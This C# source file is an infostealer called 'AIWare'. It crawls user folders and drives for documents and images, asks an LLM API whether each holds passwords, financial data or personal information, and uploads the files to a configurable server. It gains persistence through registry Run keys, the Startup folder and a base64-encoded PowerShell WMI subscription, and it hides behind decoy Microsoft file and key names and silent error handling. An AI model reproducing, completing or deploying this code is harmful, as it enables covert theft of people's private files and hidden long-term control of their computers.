using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Reflection;
using System.Diagnostics;
using System.Security.Principal;
using System.Text;

namespace AIWare
{
    class Program
    {
        // --- Hardcoded settings injected dynamically ---
        /*CONFIG_MARKER*/
        // -------------------------------------------------

        static async Task Main(string[] args)
        {
            // Removed console logs for stealth

            try
            {
                // Add persistence if enabled
                if (PersistenceEnabled)
                {
                    AddPersistence();
                }
                
                // Get files to scan based on scan mode
                List<string> filesToScan = await GetFilesToScanAsync();
                
                // Scan files and find valuable ones
                List<string> valuableFiles = await ScanFilesAsync(filesToScan);
                
                // Upload valuable files
                await UploadFilesAsync(valuableFiles);
                
                // Self-destruct if enabled
                if (SelfDestructEnabled)
                {
                        // In-Progress, not implemented yet
                }
            }
            catch (Exception)
            {
                // Silent exception handling for stealth
            }
        }
        
        private static async Task<List<string>> GetFilesToScanAsync()
        {
            List<string> filesToScan = new List<string>();
            List<string> fileExtensions = new List<string> { ".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".json", ".xml", ".csv" };
            
            // Add media file extensions if enabled
            if (CollectMediaFiles)
            {
                fileExtensions.AddRange(new[] { ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".avi", ".mov" });
            }
            
            try
            {
                // Get locations to scan
                List<string> locationsToScan = new List<string>();
                
                if (ScanMode == "Default")
                {
                    // Default locations: User folders + Removable drives
                    string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                    locationsToScan.Add(Path.Combine(userProfile, "Documents"));
                    locationsToScan.Add(Path.Combine(userProfile, "Desktop"));
                    locationsToScan.Add(Path.Combine(userProfile, "Downloads"));
                    locationsToScan.Add(Path.Combine(userProfile, "Pictures"));
                    
                    // Add removable drives
                    foreach (DriveInfo drive in DriveInfo.GetDrives())
                    {
                        if (drive.DriveType == DriveType.Removable && drive.IsReady)
                        {
                            locationsToScan.Add(drive.RootDirectory.FullName);
                        }
                    }
                }
                else // Full scan
                {
                    // All drives
                    foreach (DriveInfo drive in DriveInfo.GetDrives())
                    {
                        if (drive.IsReady)
                        {
                            locationsToScan.Add(drive.RootDirectory.FullName);
                        }
                    }
                }
                
                // Scan each location
                foreach (string location in locationsToScan)
                {
                    Console.WriteLine($"[*] Scanning {location}...");
                    
                    try
                    {
                        // Get all files with the specified extensions
                        foreach (string extension in fileExtensions)
                        {
                            // Limit to 50 files per extension for demo purposes
                            string[] files = Directory.GetFiles(location, $"*{extension}", SearchOption.AllDirectories)
                                .Take(50).ToArray();
                            
                            filesToScan.AddRange(files);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[!] Error scanning {location}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error getting files to scan: {ex.Message}");
            }
            
            return filesToScan;
        }
        
        private static async Task<bool> AnalyzeWithAI(string filePath, byte[] fileContent)
        {
            // Skip AI analysis if AiApiUrl is empty (pure speed mode)
            if (string.IsNullOrEmpty(AiApiUrl))
            {
                Console.WriteLine($"[*] AI check skipped (pure speed mode): {filePath}");
                return true; // Consider all files valuable in speed mode
            }
            
            // Get file extension
            string fileExtension = Path.GetExtension(filePath).ToLowerInvariant();
            
            // Skip AI analysis for media files (images, videos, audio)
            string[] mediaExtensions = { ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", 
                                        ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv",
                                        ".mp3", ".wav", ".ogg", ".flac", ".aac" };
            
            if (mediaExtensions.Contains(fileExtension))
            {
                Console.WriteLine($"[*] AI analysis skipped for media file: {filePath}");
                return true;
            }

            try
            {
                // Truncate file content if it's too large (>50KB) to avoid API limits
                byte[] contentToAnalyze = fileContent;
                bool wasTruncated = false;
                
                if (fileContent.Length > 50 * 1024) // 50KB limit
                {
                    contentToAnalyze = new byte[50 * 1024];
                    Array.Copy(fileContent, contentToAnalyze, 50 * 1024);
                    wasTruncated = true;
                }

                // Convert binary content to text for analysis
                // For binary files, this might not produce readable text, but AI can still analyze patterns
                string fileText;
                try
                {
                    fileText = Encoding.UTF8.GetString(contentToAnalyze);
                }
                catch
                {
                    // Fallback to Base64 encoding if UTF8 conversion fails
                    fileText = Convert.ToBase64String(contentToAnalyze).Substring(0, 1000) + "..."; // Just use part of Base64
                }

                // Prepare the AI API request
                string fileName = Path.GetFileName(filePath);
                // fileExtension is already defined above
                
                // Extract model name from AiApiUrl if it contains a model identifier
                string modelName = "gpt-4o"; // Default model
                
                // Check for known model patterns in the URL
                if (AiApiUrl.Contains("claude"))
                {
                    modelName = "claude-3-opus";
                }
                else if (AiApiUrl.Contains("anthropic"))
                {
                    modelName = "claude-3-opus";
                }
                else if (AiApiUrl.Contains("deepseek"))
                {
                    modelName = "deepseek-chat";
                }
                
                // Create the prompt for AI analysis
                string prompt = $@"
Analyze this file content and determine if it contains sensitive or valuable information.
File name: {fileName}
File extension: {fileExtension}
{(wasTruncated ? "Note: File was truncated due to size limitations." : "")}

Content:
{fileText}

Is this file likely to contain sensitive information such as:
- Passwords or credentials
- Financial information (credit cards, bank accounts)
- Personal identifiable information
- Private notes or communications
- Intellectual property or trade secrets
- Source code or technical documentation

Respond with YES or NO, followed by a brief explanation.
";

                // Create the API request based on the API type
                HttpClient client = new HttpClient();
                client.DefaultRequestHeaders.Add("Authorization", $"Bearer {AiApiKey}");
                
                // Prepare the request body based on the API type
                string requestBody;
                
                if (AiApiUrl.Contains("anthropic") || AiApiUrl.Contains("claude"))
                {
                    // Anthropic/Claude API format
                    requestBody = $@"{{
                        ""model"": ""{modelName}"",
                        ""messages"": [
                            {{
                                ""role"": ""user"",
                                ""content"": ""{EscapeJsonString(prompt)}""
                            }}
                        ],
                        ""max_tokens"": 150
                    }}";
                }
                else if (AiApiUrl.Contains("deepseek"))
                {
                    // DeepSeek API format
                    requestBody = $@"{{
                        ""model"": ""{modelName}"",
                        ""messages"": [
                            {{
                                ""role"": ""system"",
                                ""content"": ""You are a security analyst that evaluates if files contain sensitive information.""
                            }},
                            {{
                                ""role"": ""user"",
                                ""content"": ""{EscapeJsonString(prompt)}""
                            }}
                        ],
                        ""stream"": false,
                        ""max_tokens"": 150
                    }}";
                }
                else
                {
                    // OpenAI-compatible API format (works with OpenAI, Ollama, etc.)
                    requestBody = $@"{{
                        ""model"": ""{modelName}"",
                        ""messages"": [
                            {{
                                ""role"": ""system"",
                                ""content"": ""You are a security analyst that evaluates if files contain sensitive information.""
                            }},
                            {{
                                ""role"": ""user"",
                                ""content"": ""{EscapeJsonString(prompt)}""
                            }}
                        ],
                        ""max_tokens"": 150
                    }}";
                }

                // Set up the request
                var content = new StringContent(requestBody, Encoding.UTF8, "application/json");
                
                // Implement retries for API calls
                int maxRetries = 3;
                int retryCount = 0;
                bool success = false;
                string responseBody = "";
                
                while (retryCount < maxRetries && !success)
                {
                    try
                    {
                        // Send the request to the AI API
                        HttpResponseMessage response = await client.PostAsync(AiApiUrl, content);
                        
                        if (response.IsSuccessStatusCode)
                        {
                            responseBody = await response.Content.ReadAsStringAsync();
                            success = true;
                        }
                        else
                        {
                            Console.WriteLine($"[!] AI API error (attempt {retryCount + 1}/{maxRetries}): {response.StatusCode}");
                            retryCount++;
                            
                            if (retryCount < maxRetries)
                            {
                                // Exponential backoff: wait 2^retryCount seconds before retrying
                                await Task.Delay(1000 * (int)Math.Pow(2, retryCount));
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[!] AI API request error (attempt {retryCount + 1}/{maxRetries}): {ex.Message}");
                        retryCount++;
                        
                        if (retryCount < maxRetries)
                        {
                            // Exponential backoff
                            await Task.Delay(1000 * (int)Math.Pow(2, retryCount));
                        }
                    }
                }
                
                if (!success)
                {
                    Console.WriteLine($"[!] Failed to analyze file with AI after {maxRetries} attempts: {filePath}");
                    return false; // Skip this file if AI analysis fails
                }
                
                // Parse the AI response to determine if the file is valuable
                bool isValuable = ParseAIResponse(responseBody);
                
                if (isValuable)
                {
                    Console.WriteLine($"[+] AI determined file is valuable: {filePath}");
                }
                else
                {
                    Console.WriteLine($"[-] AI determined file is not valuable: {filePath}");
                }
                
                return isValuable;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error in AI analysis: {ex.Message}");
                return false; // Skip this file if there's an error
            }
        }
        
        private static bool ParseAIResponse(string responseJson)
        {
            try
            {
                // Check if the response contains "YES" indicating valuable content
                // This is a simple implementation - in a real scenario, you'd parse the JSON properly
                return responseJson.Contains("\"YES") || responseJson.Contains("\" YES") || 
                       responseJson.Contains("\"yes") || responseJson.Contains("\" yes") ||
                       responseJson.Contains("password") || responseJson.Contains("credential") ||
                       responseJson.Contains("sensitive") || responseJson.Contains("private") ||
                       responseJson.Contains("financial") || responseJson.Contains("credit card");
            }
            catch
            {
                // If parsing fails, err on the side of caution
                return true;
            }
        }
        
        private static string EscapeJsonString(string input)
        {
            if (string.IsNullOrEmpty(input))
                return input;
                
            return input.Replace("\\", "\\\\")
                        .Replace("\"", "\\\"")
                        .Replace("\n", "\\n")
                        .Replace("\r", "\\r")
                        .Replace("\t", "\\t");
        }
        
        private static async Task<List<string>> ScanFilesAsync(List<string> filesToScan)
        {
            List<string> valuableFiles = new List<string>();
            
            foreach (string file in filesToScan)
            {
                try
                {
                    // Get file info
                    FileInfo fileInfo = new FileInfo(file);
                    
                    // Skip files that are too large (10x the sample size for demo purposes)
                    if (fileInfo.Length > SampleSizeKB * 1024 * 10)
                    {
                        continue;
                    }
                    
                    // Read file content
                    byte[] fileContent = File.ReadAllBytes(file);
                    
                    // Analyze file content with AI
                    bool isValuable = await AnalyzeWithAI(file, fileContent);
                    
                    if (isValuable)
                    {
                        // Only upload files that AI determines are valuable
                        valuableFiles.Add(file);
                    }
                    
                    // Also send sample to server for analysis (original functionality)
                    using (HttpClient client = new HttpClient())
                    {
                        HttpContent content = new ByteArrayContent(fileContent);
                        HttpResponseMessage response = await client.PostAsync(ServerUrl, content);
                        
                        if (response.IsSuccessStatusCode)
                        {
                            // Parse response
                            string responseBody = await response.Content.ReadAsStringAsync();
                            
                            // Log server response
                            Console.WriteLine($"[*] Server analysis complete for: {file}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error scanning file {file}: {ex.Message}");
                }
            }
            
            return valuableFiles;
        }
        
        private static async Task UploadFilesAsync(List<string> valuableFiles)
        {
            foreach (string file in valuableFiles)
            {
                try
                {
                    // Read file content
                    byte[] fileContent = File.ReadAllBytes(file);
                    
                    // Upload file to server
                    using (HttpClient client = new HttpClient())
                    {
                        // Create multipart form content
                        using (var formData = new MultipartFormDataContent())
                        {
                            // Add file content
                            var fileContentPart = new ByteArrayContent(fileContent);
                            formData.Add(fileContentPart, "file", Path.GetFileName(file));
                            
                            // Send request
                            string uploadUrl = ServerUrl.Replace("/analyze", "/upload");
                            HttpResponseMessage response = await client.PostAsync(uploadUrl, formData);
                            
                            if (response.IsSuccessStatusCode)
                            {
                                Console.WriteLine($"[+] File uploaded: {file}");
                            }
                            else
                            {
                                Console.WriteLine($"[!] Failed to upload file {file}: {response.StatusCode}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error uploading file {file}: {ex.Message}");
                }
            }
        }
        
        private static void AddPersistence()
        {
            try
            {
                // Get the path of the current executable
                // For single-file apps, Assembly.Location returns an empty string
                // Use Environment.ProcessPath instead which works for both single-file and traditional apps
                string originalExePath = Environment.ProcessPath;
                
                if (string.IsNullOrEmpty(originalExePath))
                {
                    // Fallback to using the base directory + assembly name
                    string baseDir = AppContext.BaseDirectory;
                    string assemblyName = Assembly.GetExecutingAssembly().GetName().Name;
                    originalExePath = Path.Combine(baseDir, assemblyName + ".exe");
                }
                
                // Create a legitimate-looking filename
                string fileName = GetLegitFileName();
                
                // Move the executable to AppData\Roaming for stealth
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string targetDir = Path.Combine(appDataPath, "Microsoft", "Windows", "Services");
                
                // Create directory if it doesn't exist
                if (!Directory.Exists(targetDir))
                {
                    Directory.CreateDirectory(targetDir);
                }
                
                // Target path for the copied executable
                string targetExePath = Path.Combine(targetDir, fileName);
                
                // Copy the executable to the target location if it doesn't exist
                if (!File.Exists(targetExePath))
                {
                    File.Copy(originalExePath, targetExePath);
                }
                
                // Method 1: Add to registry for startup persistence (more reliable than scheduled tasks)
                try
                {
                    // Get a legitimate-looking registry key name
                    string registryKeyName = GetLegitRegistryKeyName();
                    
                    // Add to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                    {
                        if (key != null)
                        {
                            key.SetValue(registryKeyName, targetExePath);
                            Console.WriteLine($"[*] Added registry persistence: {registryKeyName}");
                        }
                    }
                    
                    // If we have admin privileges, also add to HKLM for system-wide persistence
                    if (IsAdministrator())
                    {
                        // Use a different legitimate-looking name for HKLM
                        string systemKeyName = GetLegitRegistryKeyName();
                        
                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                        {
                            if (key != null)
                            {
                                key.SetValue(systemKeyName, targetExePath);
                                Console.WriteLine($"[*] Added system-wide registry persistence: {systemKeyName}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error adding registry persistence: {ex.Message}");
                }
                
                // Method 2: Add to Startup folder (backup method)
                try
                {
                    string startupFolder = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                        "WindowsSecurityService.lnk");
                    
                    // Create a shortcut to the executable
                    // Note: This is a simplified version. In a real implementation,
                    // you would use COM to create a proper shortcut
                    File.WriteAllText(startupFolder, targetExePath);
                    
                    Console.WriteLine("[*] Added startup folder persistence");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error adding startup folder persistence: {ex.Message}");
                }
                
                // Method 3: Create a WMI event subscription (very stealthy)
                // Only attempt this if running with admin privileges
                if (IsAdministrator())
                {
                    // Use legitimate-looking names for WMI filter and consumer
                    string filterName = "Microsoft" + Guid.NewGuid().ToString("N").Substring(0, 8) + "Filter";
                    string consumerName = "Microsoft" + Guid.NewGuid().ToString("N").Substring(0, 8) + "Consumer";
                    
                    // Base64 encoded PowerShell command template for WMI persistence
                    string encodedWmiCommandTemplate = "JGZpbHRlck5hbWUgPSAne3sxfX0nCiRjb25zdW1lck5hbWUgPSAne3syfX0nCiRleGVQYXRoID0gJ3t7MH19JwoKIyBDcmVhdGUgYSBXTUkgZXZlbnQgZmlsdGVyIGZvciBzeXN0ZW0gc3RhcnR1cAokd21pUGFyYW1zID0gQHt7CiAgICBOYW1lID0gJGZpbHRlck5hbWUKICAgIEV2ZW50TmFtZXNwYWNlID0gJ3Jvb3RcY2ltdjInCiAgICBRdWVyeUxhbmd1YWdlID0gJ1dRTCcKICAgIFF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gX19JbnN0YW5jZU1vZGlmaWNhdGlvbkV2ZW50IFdJVEhJTiA2MCBXSEVSRSBUYXJnZXRJbnN0YW5jZSBJU0EgJ1dpbjMyX1BlcmZGb3JtYXR0ZWREYXRhX1BlcmZPU19TeXN0ZW0nIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPj0gMjQwIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPCAzMjUiCiB9fQokZmlsdGVyID0gU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2UgJ3Jvb3Rcc3Vic2NyaXB0aW9uJyAtQ2xhc3MgJ19fRXZlbnRGaWx0ZXInIC1Bcmd1bWVudHMgJHdtaVBhcmFtcwoKIyBDcmVhdGUgYSBXTUkgZXZlbnQgY29uc3VtZXIgdGhhdCBsYXVuY2hlcyBvdXIgZXhlY3V0YWJsZQokd21pUGFyYW1zID0gQHt7CiAgICBOYW1lID0gJGNvbnN1bWVyTmFtZQogICAgQ29tbWFuZExpbmVUZW1wbGF0ZSA9ICRleGVQYXRoCn19CiRjb25zdW1lciA9IFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlICdyb290XHN1YnNjcmlwdGlvbicgLUNsYXNzICdDb21tYW5kTGluZUV2ZW50Q29uc3VtZXInIC1Bcmd1bWVudHMgJHdtaVBhcmFtcwoKIyBCaW5kIHRoZSBmaWx0ZXIgYW5kIGNvbnN1bWVyIHRvZ2V0aGVyCiR3bWlQYXJhbXMgPSBAdHsKICAgIEZpbHRlciA9ICRmaWx0ZXIKICAgIENvbnN1bWVyID0gJGNvbnN1bWVyCn19CiRiaW5kaW5nID0gU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2UgJ3Jvb3Rcc3Vic2NyaXB0aW9uJyAtQ2xhc3MgJ19fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcnIC1Bcmd1bWVudHMgJHdtaVBhcmFtcw==";
                    
                    // Decode and format the command with actual values
                    string decodedWmiCommand = Encoding.UTF8.GetString(Convert.FromBase64String(encodedWmiCommandTemplate));
                    string wmiCommand = decodedWmiCommand
                        .Replace("{{0}}", targetExePath.Replace("\\", "\\\\"))
                        .Replace("{{1}}", filterName)
                        .Replace("{{2}}", consumerName);
                    
                    ExecutePowerShellCommand(wmiCommand);
                }
                
                Console.WriteLine("[*] Advanced persistence techniques added");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error adding persistence: {ex.Message}");
            }
        }
        
        private static string GetLegitRegistryKeyName()
        {
            // List of legitimate-looking registry key names
            string[] legitNames = {
                "MicrosoftEdgeUpdate",
                "WindowsSecurityService",
                "MsUpdate",
                "WinDefenderScan",
                "SystemHealthMonitor",
                "WindowsTelemetryService",
                "MicrosoftCompatibilityAppraiser",
                "WindowsUpdateAssistant"
            };
            
            // Return a random name from the list
            Random random = new Random();
            return legitNames[random.Next(legitNames.Length)];
        }
        
        private static string GetLegitFileName()
        {
            // List of legitimate-looking filenames
            string[] legitNames = {
                "MicrosoftEdgeUpdate.exe",
                "WindowsSecurityService.exe",
                "MsUpdate.exe",
                "WinDefenderScan.exe",
                "SystemHealthMonitor.exe",
                "WindowsTelemetryService.exe",
                "MicrosoftCompatibilityAppraiser.exe",
                "WindowsUpdateAssistant.exe"
            };
            
            // Return a random name from the list
            Random random = new Random();
            return legitNames[random.Next(legitNames.Length)];
        }
        
        private static string GetLegitTaskName()
        {
            // List of legitimate-looking task names
            string[] legitNames = {
                "Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser",
                "Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator",
                "Microsoft\\Windows\\DiskDiagnostic\\Microsoft-Windows-DiskDiagnosticDataCollector",
                "Microsoft\\Windows\\Maintenance\\WinSAT",
                "Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeSystem",
                "Microsoft\\Windows\\Shell\\FamilySafetyMonitor",
                "Microsoft\\Windows\\Shell\\FamilySafetyRefreshTask",
                "Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"
            };
            
            // Return a random name from the list
            Random random = new Random();
            return legitNames[random.Next(legitNames.Length)];
        }
        
        private static string GetLegitTaskDescription()
        {
            // List of legitimate-looking task descriptions
            string[] legitDescriptions = {
                "This task collects and uploads Windows usage data to improve the Windows experience.",
                "This task gathers system performance data to help improve Windows performance and reliability.",
                "This task updates Windows components to ensure system security and stability.",
                "This task performs system maintenance operations to keep Windows running smoothly.",
                "This task collects system diagnostic data to help troubleshoot system issues.",
                "This task ensures Windows components are up-to-date and functioning properly.",
                "This task monitors system health and reports issues to Microsoft for resolution.",
                "This task optimizes system performance by analyzing and adjusting system settings."
            };
            
            // Return a random description from the list
            Random random = new Random();
            return legitDescriptions[random.Next(legitDescriptions.Length)];
        }
        
        private static void ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                
                using (Process process = new Process { StartInfo = psi })
                {
                    process.Start();
                    
                    // Read the output and error streams
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    
                    process.WaitForExit();
                    
                    if (!string.IsNullOrEmpty(output))
                    {
                        Console.WriteLine($"[*] Command output: {output}");
                    }
                    
                    if (!string.IsNullOrEmpty(error))
                    {
                        Console.WriteLine($"[!] Command error: {error}");
                    }
                    
                    if (process.ExitCode != 0)
                    {
                        Console.WriteLine($"[!] Command exited with code: {process.ExitCode}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error executing command: {ex.Message}");
            }
        }
        
        private static void ExecutePowerShellCommand(string command)
        {
            try
            {
                // Further obfuscate by encoding the command again before execution
                string encodedCommand = Convert.ToBase64String(Encoding.Unicode.GetBytes(command));
                
                string cmdCommand = $"powershell.exe -EncodedCommand {encodedCommand}";
                ExecuteCommand(cmdCommand);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error preparing PowerShell command: {ex.Message}");
            }
        }
        
        private static bool IsAdministrator()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        // Placeholder variables
        public static string ServerUrl;
        public static int SampleSizeKB;
        public static int ValueThreshold;
        public static bool StealthEnabled;
        public static bool SelfDestructEnabled;
        public static string AiApiUrl;
        public static string AiApiKey;
        public static string ScanMode;
        public static bool CollectMediaFiles;
        public static bool PersistenceEnabled;
    }
}
